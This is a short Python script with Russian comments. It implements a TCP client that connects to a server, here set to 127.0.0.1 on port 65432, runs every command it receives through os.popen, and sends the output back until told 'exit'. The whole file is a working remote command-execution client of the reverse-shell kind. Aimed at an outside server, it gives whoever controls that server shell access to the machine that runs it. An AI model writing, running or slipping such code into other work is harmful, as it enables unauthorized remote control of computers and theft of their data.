import socket
import os

def start_client(host, port):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    print(f"Подключено к серверу {host}:{port}")


    while True:
      command = s.recv(1024).decode()
      if command.lower() == 'exit':
        print("Выход из клиента.")
        break
      print(f"Получена команда: {command}")
      
      try:
        # Выполнение команды и получение результата
        output = os.popen(command).read()

      except Exception as e:
        output = str(e)

      # Отправка результата обратно на сервер
      s.sendall(output.encode())


if __name__ == "__main__":
  start_client("127.0.0.1", 65432)
